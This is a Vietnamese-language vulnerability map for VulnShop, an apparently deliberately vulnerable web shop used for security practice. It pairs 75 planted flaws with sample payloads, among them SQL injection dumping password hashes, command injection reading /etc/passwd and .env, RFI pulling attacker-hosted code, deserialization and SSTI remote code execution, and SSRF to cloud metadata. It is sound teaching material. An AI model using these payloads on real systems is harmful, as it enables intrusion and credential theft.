# VULNS.md — Bản đồ 75 lỗ hổng trong VulnShop

Mỗi lỗ hổng đánh dấu `[VULN #N]` ngay trong code. Payload dùng được với domain
frontend (qua Cloudflare Pages) hoặc thẳng backend `https://<backend>.onrender.com`.

Chú thích: **[code]** = lỗi được cài đặt thật, khai thác được; **[config]** = cấu hình yếu có chủ đích; **[doc]** = chỉ tài liệu/kịch bản (không thể cài trong app).

| # | Lỗ hổng | Điểm lỗi | Payload / cách khai thác mẫu |
|---|---------|----------|------------------------------|
| 1 | SQL Injection **[code]** | `GET /api/products/search?q=`, `/api/products/sort?col=`, `POST /api/auth/register` (email/role), `GET /api/auth/login` (email), `GET /api/legacy/me?session=`, `PUT /api/profile` (tên cột), GraphQL `user(id)` | `?q=%' OR 1=1--` · `?q=%' UNION SELECT 1, email, password_hash, 0, 0, 'x' FROM users--` · `?col=price;SELECT pg_sleep(5)--` |
| 2 | NoSQL Injection **[code]** | `POST /api/products/filter` (mini-Mongo evaluator) | `{"price":{"$ne":null}}` · `{"$where":"this.price<100"}` (eval) · `{"name":{"$regex":"^R"}}` |
| 3 | Command Injection **[code]** | `GET /api/utils/ping?host=` | `?host=127.0.0.1;id` · `?host=$(whoami)` · `?host=1%0awhoami` |
| 4 | OS Command Injection **[code]** | `POST /api/admin/exec {cmd}` (+ `GET /api/utils/disk?dir=`) | `{"cmd":"id; cat /etc/passwd"}` · `?dir=.;cat /app/.env` |
| 5 | LDAP Injection **[code]** | `POST /api/ldap/bind`, `/api/ldap/search` (directory ảo) | `{"uid":"*","password":"*"}` (login mọi user) · filter `(&(objectClass=person)(uid=*))` |
| 6 | XML Injection **[code]** | `POST /api/products/wishlist` → `GET /api/products/export/xml`; `POST /api/xml/echo` | wishlist name `x</name></wishlist><product id="999"><name>PWNED` — phá cấu trúc XML export |
| 7 | XPath Injection **[code]** | `GET /api/products/xpath?q=` | `?q=x" \|\| "1"=="1` (trả toàn bộ records + secret) |
| 8 | XSS (reflected + stored) **[code]** | Home reflected `?q=` (dangerouslySetInnerHTML); comments; profile signature | comment `<img src=x onerror=alert(1)>` (đã seed sẵn) · `?q=<img src=x onerror=alert(1)>` |
| 9 | CSRF **[code]** | `GET /api/orders/transfer` (state-changing GET, cookie SameSite=None, no token) | mở `/csrf-demo.html` khi đã login legacy → auto transfer |
| 10 | SSRF **[code]** | `GET /api/net/fetch?url=` (response trả về attacker) | `?url=http://169.254.169.254/latest/meta-data/` · `?url=http://127.0.0.1:6379/` |
| 11 | IDOR **[code]** | `GET /api/orders/:id` (không check ownership) | đổi id tuần tự `/orders/1`, `/orders/2`... |
| 12 | Broken Access Control **[code]** | `/api/admin/*` gate chỉ là client-side + static token + `X-Original-URL` middleware | header `x-admin-token: admin-token-123` (lộ ở `/api/debug/config`) · `X-Original-Url: /api/admin/stats` |
| 13 | Privilege Escalation **[code]** | gate tin `x-user-role` header; `PUT /api/profile` cho tự set role/is_admin | header `x-user-role: admin` · `PUT /api/profile {"role":"admin","is_admin":true}` |
| 14 | Authentication Bypass **[code]** | LDAP `*` login; SAML không kiểm tra chữ ký; JWT decode-no-verify; adminBypass gadget | `POST /api/ldap/bind {"uid":"*","password":"*"}` · `POST /api/saml/consume` với assertion tự chế |
| 15 | Broken Authentication **[code]** | MD5 password, token random Math.random, token trong URL, reset không hết hạn | xem #44/#45/#66 |
| 16 | Session Hijacking **[code]** | cookie `session` không HttpOnly/Secure; `GET /api/legacy/me?session=` | đánh cắp token qua XSS → `?session=<token>` từ máy khác |
| 17 | Session Fixation **[code]** | `POST /api/auth/login` nhận `sessionId` từ body | set cookie trước bằng id mình biết → đăng nhập nạn nhân bằng id đó |
| 18 | Session Replay **[code]** | `/api/auth/replay/issue` + `/verify` — HMAC-md5, không expiry/nonce | dùng lại token đã issue vô thời hạn |
| 19 | Brute Force **[code]** | `/api/auth/login` — chỉ rate limit 5/phút (bypass được #52), không lockout | script thử password phổ biến |
| 20 | Credential Stuffing **[code]** | cùng endpoint, không captcha/không phát hiện reuse | đăng nhập bằng list leaked creds |
| 21 | Password Spraying **[code]** | password policy yếu + message phân biệt | thử `admin123`, `password123`, `1` trên nhiều account |
| 22 | Directory Traversal **[code]** | `GET /api/files/download?name=` | `?name=../../../../etc/passwd` · `?name=/etc/passwd` |
| 23 | LFI **[code]** | `GET /api/files/read?page=` | `?page=../../../../etc/passwd` · `?page=../../package.json` |
| 24 | RFI **[code]** | cùng endpoint — URL http(s) được fetch rồi **eval** | `?page=https://<attacker>/pwn.js` với nội dung `require('child_process').execSync('id').toString()` |
| 25 | Arbitrary File Upload **[code]** | `POST /api/files/upload` — giữ nguyên tên (có `../`), không check nội dung | upload `shell.html` chứa `<script>alert(document.cookie)</script>` → mở `/uploads/shell.html` |
| 26 | Unrestricted File Upload **[code]** | cùng endpoint — không extension/MIME allowlist | `.php.jpg`, `.svg` (script chạy khi mở trực tiếp), file .bat/.exe... |
| 27 | RCE **[code]** | `POST /api/utils/eval`, eval trong `$where`, eval RFI, SSTI, unserialize | `{"code":"require('child_process').execSync('id').toString()"}` |
| 28 | Insecure Deserialization **[code]** | `POST /api/utils/unserialize` (node-serialize style) | `{"payload":"{\"rce\":\"_$$ND_FUNC$$_function(){ return require('child_process').execSync('id').toString() }()\"}"}` |
| 29 | XXE **[code]** | `POST /api/xml/parse {xml}` — parser tự viết hỗ trợ external entity | `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>` · billion laughs (cap 1MB) |
| 30 | SSTI **[code]** | `GET /api/orders/export?tpl=` (lodash template, imports `require`) | `?tpl=<%= require("child_process").execSync("id").toString() %>` |
| 31 | Client-Side Template Injection **[code]** | trang Product — chữ ký compile bằng `_.template` trong browser | `<%= constructor.constructor("alert(document.domain)")() %>` |
| 32 | Open Redirect **[code]** | `GET /api/net/redirect?url=` | `?url=https://evil.tld/phish` |
| 33 | HTTP Request Smuggling **[config]** | `backend/nginx/app.conf`: proxy HTTP/1.1, giữ Connection/TE từ client, đổi max body — lỗi framing kiểu CL.TE khi ghép proxy | gửi request 2 lần `Content-Length` / `Transfer-Encoding: chunked` đè lẫn qua gateway |
| 34 | HTTP Response Splitting **[code]** | `GET /api/net/jump?to=` | `?to=x%0d%0aSet-Cookie:%20pwned=1` (Node mới từ chối → stack leak; trên stack cũ/proxy → split thật) |
| 35 | Host Header Injection **[code]** | `POST /api/auth/forgot` — link reset dựng từ `X-Forwarded-Host` | `curl -X POST -H "X-Forwarded-Host: evil.tld" -d '{"email":"victim@vulnshop.local"}' /api/auth/forgot` |
| 36 | CRLF / Log Injection **[code]** | logger ghi User-Agent thô; xem tại `GET /api/admin/logs` | `curl -A "$(printf 'x\n[admin] LOGIN admin@vulnshop.local password=xxx')"` → log giả |
| 37 | Cache Poisoning **[code]** | `GET /api/net/echo-headers` phản chiếu `X-Forwarded-Host`, `Cache-Control: public` + CF Cache Rule | `curl -H "X-Forwarded-Host: evil.tld" https://site/api/net/echo-headers` → cache toàn site chứa assetBase độc |
| 38 | Web Cache Deception **[code]** | `GET /api/cache/profile/:anything.css` — profile JSON + `Cache-Control: public` | khi login: mở `/api/cache/profile/abc.css` → profile bị cache ở URL đó, ai cũng đọc được |
| 39 | Clickjacking **[config]** | thiếu `X-Frame-Options`/`frame-ancestors` ở nginx + CSP meta | mở `/clickjack-demo.html` |
| 40 | CORS Misconfiguration **[code]** | middleware CORS reflect mọi Origin + credentials | `curl -H "Origin: https://evil.tld" -i /api/v2/users` → `Access-Control-Allow-Origin: https://evil.tld` + credentials |
| 41 | CSP Misconfiguration **[config]** | meta CSP `default-src * 'unsafe-inline' 'unsafe-eval'`; endpoint `/api/csp-demo` | payload script inline chạy tự do |
| 42 | Security Misconfiguration **[code]** | `/api/docs` (route map), `/api/debug/config`, GraphiQL public, nginx `server_tokens on`, autoindex `/uploads/`, stack traces, error chi tiết | mở `/api/docs`, `https://site/graphql` (GraphiQL IDE), `/uploads/` (listing) |
| 43 | Information Disclosure **[code]** | stack trong mọi error response, SQL echo, đường dẫn tuyệt đối, internal_cost, sourcemap prod | `GET /api/debug/error?msg=x` · `/api/products/search?q='` (SQL error) |
| 44 | Sensitive Data Exposure **[code]** | `/api/auth/me`, `/api/legacy/me`, `/api/v2/users`, JWT login response — password_hash MD5, cc_number, api_key | `GET /api/v2/users` (không auth) |
| 45 | Cryptographic Failures **[code]** | MD5 hash, Math.random token, HMAC-md5, key cố định | `/api/utils/token`, `/api/crypto/hash?text=admin123` → crack offline |
| 46 | Weak Password Policy **[code]** | register/login chấp nhận password 1 ký tự | `POST /api/auth/register {"email":"a@b.c","password":"1"}` |
| 47 | Weak Encryption **[code]** | AES-128-**ECB** key cứng; MD5/SHA1; base64 | `/api/crypto/encrypt?text=...` — deterministic, malleable |
| 48 | Insecure API **[code]** | tổng hợp: over-fetching (full row), verbose error, no versioning, GET đổi state, GraphQL BOLA | xem các mục liên quan |
| 49 | BOLA **[code]** | `GET /api/coupons/list?owner=`, `GET /api/v2/orders/:uuid`, GraphQL `user(id)` | `?owner=legacy-victim-2` · graphql `{"query":"{user(id:\"legacy-victim-2\"){email passwordHash}}"}` |
| 50 | BFLA **[code]** | `POST /api/v2/admin/delete-user`, `GET /api/v2/users` — **không auth** | `curl -X POST -d '{"id":"legacy-admin-1"}' /api/v2/admin/delete-user` |
| 51 | Mass Assignment **[code]** | `PUT /api/profile` — `Object.keys(req.body)` ghi thẳng vào DB | `{"role":"admin","is_admin":true,"balance":999999}` |
| 52 | Rate Limiting Bypass **[code]** | limiter key = header `X-Forwarded-For` | mỗi request 1 XFF mới: `for i in $(seq 1 50); do curl -H "X-Forwarded-For: 1.2.3.$i" ...; done` |
| 53 | Race Condition **[code]** | `POST /api/coupon/redeem` — check-then-act, sleep 150ms giữa check/update | bắn 10 request song song cùng lúc (nút **Race x8** trong app) — coupon VULN50 max 1 lần dùng được pass nhiều lần |
| 54 | Business Logic **[code]** | `POST /api/orders` tin `price` client, qty âm; transfer số âm; coupon không per-user | `{"productId":1,"qty":1,"price":0}` mua 0đ · `{"qty":-100}` total âm · transfer `amount=-1000` tự cộng tiền |
| 55 | DNS Rebinding **[code]** | `GET /api/net/fetch` không chặn IP private/định danh lại IP sau resolve | domain attacker trỏ A 1.1.1.1 → rebinding sang 169.254.169.254 |
| 56 | Subdomain Takeover **[doc]** | thêm CNAME `old-api` → project Pages chưa tồn tại (docs/DEPLOY.md Bước 6) | claim project `vulnshop-gone.pages.dev` để takeover |
| 57 | Prototype Pollution **[code]** | `POST /api/utils/merge` — merge không lọc `__proto__`; gadget = `config.adminBypass` | `{"__proto__":{"adminBypass":true}}` → mọi `/api/admin/*` mở (check `/api/admin/stats` không header) |
| 58 | DOM Clobbering **[code]** | trang `/domxss` — gadget `window.config.allow` | `#<form id=config><input name=allow></form><img src=x onerror=alert(1)>` |
| 59 | DOM-based XSS **[code]** | trang `/domxss` — hash → innerHTML khi safe-mode bị clobber | cùng payload #58 |
| 60 | WebSocket Vulnerabilities **[code]** | `/ws/chat` — không Origin check (CSWSH), không auth, broadcast raw, client render innerHTML | kết nối ws từ trang khác domain; gửi `<img src=x onerror=alert(1)>` |
| 61 | JWT Vulnerabilities **[code]** | secret `jwt-secret-123` (lộ ở `/api/debug/config`); `/api/auth/jwt/whoami` dùng `jwt.decode` | tự ký token `{"sub":"legacy-admin-1","role":"admin"}` với secret lộ → whoami chấp nhận |
| 62 | OAuth Misconfiguration **[code]** | `/api/oauth/authorize` không validate `redirect_uri`, không check `state`, implicit flow, token endpoint không client auth | `?redirect_uri=https://example.com` → code rơi ra ngoài; nút demo ở `/oauth-demo` |
| 63 | SAML Vulnerabilities **[code]** | `POST /api/saml/consume` — chấp nhận assertion **không kiểm tra chữ ký**, tự tạo user | base64 assertion với NameID tuỳ ý (`/api/saml/sample` làm mẫu) |
| 64 | GraphQL Vulnerabilities **[code]** | `/graphql` — introspection on, GraphiQL public, no depth limit (cycle User→orders→User), BOLA, SQLi trong resolver | `{user(id:"legacy-admin-1"){email passwordHash orders{total buyer{email}}}}` · query lồng sâu 1000 tầng → DoS |
| 65 | Web Cache Poisoning **[code]** | như #37 + `/api/cache/store/:key` cacheable | poison header → cache key chung |
| 66 | Password Reset Vulnerabilities **[code]** | token = md5(email), không expiry, reusable, response trả token, link theo Host header | `POST /api/auth/forgot {"email":"admin@vulnshop.local"}` → token `md5(email)` tính offline; `GET /api/auth/reset?token=...&password=newpass` |
| 67 | Account Enumeration **[code]** | login 404 vs 401; register 409; `GET /api/enumerate?email=` | `?email=admin@vulnshop.local` → `{"exists":true}` |
| 68 | Email Spoofing **[code]** | `POST /api/contact` — From do client truyền (recipient cố định = owner) | `{"from":"ceo@company.tld","subject":"Urgent","message":"..."}` |
| 69 | MIME Sniffing **[code]** | `/uploads-sniff/:name` trả `text/plain` không `nosniff` | upload `x.html` → mở `/uploads-sniff/x.html` → browser sniff → render HTML/JS |
| 70 | Insecure HTTP Headers **[config]** | nginx không set HSTS/XFO/nosniff/CSP; thêm `X-Powered-By`, `Referrer-Policy: unsafe-url` | `curl -I https://site/` kiểm tra |
| 71 | TLS/SSL Misconfiguration **[doc]** | Render/Cloudflare quản TLS — không thể cấu hình sai; kịch bản lab: TLS 1.0/weak cipher nếu self-managed | dùng testssl.sh khi có domain riêng |
| 72 | Dependency Vulnerabilities **[code]** | `jsonwebtoken@8.5.1`, `lodash@4.17.15` (CVE prototype pollution) — `npm audit` đỏ cố ý (CI cho phép) | `cd backend && npm audit` |
| 73 | Supply Chain **[doc]** | kịch bản: typosquatting, postinstall script, dependency confusion — CI có bước `npm audit` | soi lockfile + `npm ls` khi thêm package lạ |
| 74 | DoS **[code]** | ReDoS `GET /api/utils/regex?q=` (`/^(a\|a?)+$/`, đo thực tế: 24×'a'+b ≈ 0.6s, 30×'a'+b ≈ 76s block event loop), JSON body limit 50MB, multipart 20MB, `$where`/`$regex` eval | `?q=` + N ký tự `a` + `b` — N càng lớn event loop càng khoá lâu |
| 75 | DDoS **[doc]** | là kịch bản tấn công — phòng thủ bằng Cloudflare; không có code DDoS trong app | kịch bản lab: flood `/api/utils/regex` từ nhiều source; CF rate limit/rule là phòng thủ |

## Endpoint nhanh

```
GET  /health                                  (không lỗi — cho Render health check)
GET  /api/docs                                map mọi route (#42)
POST /auth/signup, /auth/signin               Supertokens (chuẩn, email+password)
POST /api/auth/login|register                 legacy auth lỗi (#1,#15-21,#45-46,#67)
POST /api/auth/forgot, GET /api/auth/reset    reset lỗi (#35,#66)
GET  /api/auth/jwt/whoami                     JWT decode-no-verify (#61)
GET  /api/orders/:id                          IDOR (#11)
GET  /api/orders/transfer                     CSRF GET (#9)
POST /api/coupon/redeem                       race (#53)
GET  /api/orders/export?tpl=                  SSTI (#30)
GET  /api/products/search|sort                SQLi (#1)
POST /api/products/filter                     NoSQLi (#2)
GET  /api/products/xpath                      XPath (#7)
POST /api/ldap/bind|search                    LDAP (#5)
POST /api/xml/parse                           XXE (#29)
GET  /api/files/download|read, /uploads/*     traversal/LFI/RFI (#22-24), upload (#25-26), sniff (#69)
GET  /api/utils/ping|disk|regex|token         cmdi (#3-4), ReDoS (#74), token yếu (#45)
POST /api/utils/eval|unserialize|merge        RCE (#27), deser (#28), pollution (#57)
GET  /api/net/fetch|redirect|jump|echo-headers SSRF (#10), redirect (#32), split (#34), cache (#37)
GET  /api/cache/profile/:x.css                cache deception (#38)
GET  /api/admin/* + POST /api/admin/exec      gate yếu (#12/#13), cmdi (#4), logs (#36)
POST /api/v2/admin/delete-user, GET /api/v2/users  BFLA (#50)
POST /api/contact                             email spoof (#68)
GET  /api/enumerate                           enum (#67)
GET  /api/debug/config|error, /api/headers    disclosure (#42/#43), headers (#70)
POST /graphql (GraphiQL GET)                  GraphQL (#64)
POST /api/saml/consume                        SAML (#63)
GET  /api/oauth/authorize|callback            OAuth (#62)
WS   /ws/chat                                 WebSocket (#60)
```

## Lưu ý ethical

- Chỉ khai thác trên **instance của chính bạn**. Domain `.onrender.com`/`.pages.dev` là của bạn — quét/xâm nhập hệ thống người khác là vi phạm luật.
- Bot internet sẽ tìm thấy app trong vài phút nếu public: đó là một phần của bài học. Tắt service khi không dùng.
- `SMTP_PASS`, `DATABASE_URL` thật **không** nằm trong git (Render env only); endpoint `/api/debug/config` chỉ mask các giá trị này.
